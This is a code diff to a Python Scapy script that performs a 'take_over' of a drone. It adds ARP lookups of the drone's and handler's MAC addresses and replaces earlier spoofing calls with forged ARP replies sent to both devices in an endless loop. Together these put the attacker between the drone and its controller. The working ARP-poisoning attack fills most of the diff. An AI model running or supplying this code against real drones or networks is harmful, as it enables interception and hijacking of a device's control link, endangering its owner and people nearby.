@@ -16,9 +16,29 @@ def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
     # os.kill(os.getpid(), signal.SIGTERM)
 
 
+# Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
+# an ARP reply with MAC Address
+def get_mac(ip_address):
+    # ARP request is constructed. sr function is used to send/ receive a layer 3 packet
+    # Alternative Method using Layer 2: resp, unans =  srp(Ether(
+    # dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
+    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2,
+                     timeout=10)
+    print(resp)
+    # print(resp[0][ARP])
+    # print(resp[0][ARP].hwsrc)
+    for s, r in resp:
+        print(r)
+        print(r[ARP])
+        return r[ARP].hwsrc
+    return None
+
+
 class Controller:
 
     def __init__(self):
+        # mac = hex(get_mac())[2:]
+        # self.self_mac = ':'.join([mac[i:i+2] for i in range(0, len(mac), 2)])
         self.drone_ip = ''
         self.handler_ip = ''
         self.drone_mac = ''
@@ -42,6 +62,7 @@ class Controller:
     def take_over(self):
         self._set_socket()
         self._get_ips()
+        self._get_macs()
 
         self._spoof()
 
@@ -117,7 +138,7 @@ class Controller:
 
     def _spoof(self):
         # Enable IP Forwarding on a mac
-        os.system("sysctl -w net.inet.ip.forwarding=1")
+        # os.system("sysctl -w net.inet.ip.forwarding=1")
 
         self.spoof_thread = Thread(target=self._spoof_on_background)
         self.spoof_thread.start()
@@ -125,6 +146,20 @@ class Controller:
         print("Started spoofing")
         time.sleep(3)
         print("Now starting activity")
+
+
+    def _get_macs(self):
+        self.drone_mac = get_mac(self.drone_ip)
+        if self.drone_mac is None:
+            print("Couldn't get the mac of the drone!")
+        else:
+            print("Got the mac of the drone! It's " + self.drone_mac)
+
+        self.handler_mac = get_mac(self.handler_ip)
+        if self.handler_mac is None:
+            print("Couldn't get the mac of the handler!")
+        else:
+            print("Got the mac of the handler! It's " + self.handler_mac)
 
 
     def _spoof_on_background(self):
@@ -135,15 +170,31 @@ class Controller:
         drone_ip = self.drone_ip
         drone_mac = self.drone_mac
 
+        # broadcast_ip =
+
+        handler_eth = Ether(dst=handler_mac)
+        drone_eth = Ether(dst=drone_mac)
+        spoof_drone_pkt = ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=drone_ip, hwsrc=handler_mac,
+                 psrc=handler_ip)
+        spoof_handler_pkt = ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=handler_ip, hwsrc=drone_mac,
+                 psrc=drone_ip)
+
+        send(spoof_handler_pkt, count=5)
+        send(spoof_drone_pkt, count=5)
+
         # first arp_spoof attack
-        send(ARP(op=2, pdst=handler_ip, hwdst=handler_mac, psrc=drone_ip), count=5)
-        send(ARP(op=2, pdst=drone_ip, hwdst=drone_mac, psrc=handler_ip), count=5)
+        # print(f"handler ip {handler_ip} handler mac {handler_mac} drone ip {drone_ip}")
+        # send(ARP(op=2, pdst=handler_ip, hwdst=handler_mac,
+        #          psrc=drone_ip), count=5)
+        # send(ARP(op=2, pdst=drone_ip, hwdst=drone_mac,
+        #          psrc=handler_ip), count=5)
 
         # maintenance of the spoofing
         while True:
-            send(ARP(op=2, pdst=handler_ip, hwdst=handler_mac, psrc=drone_ip))
-            send(ARP(op=2, pdst=drone_ip, hwdst=drone_mac, psrc=handler_ip))
-            time.sleep(2)
+            print("send arp")
+            send(spoof_handler_pkt)
+            send(spoof_drone_pkt)
+            time.sleep(1)
 
 
     def _restore_network(self):
@@ -151,7 +202,7 @@ class Controller:
 
 
     def _set_socket(self):
-        self.s = conf.L3socket(iface='enp3s0')
+        self.s = conf.L3socket(iface='')
 
 
     def _close_socket(self):
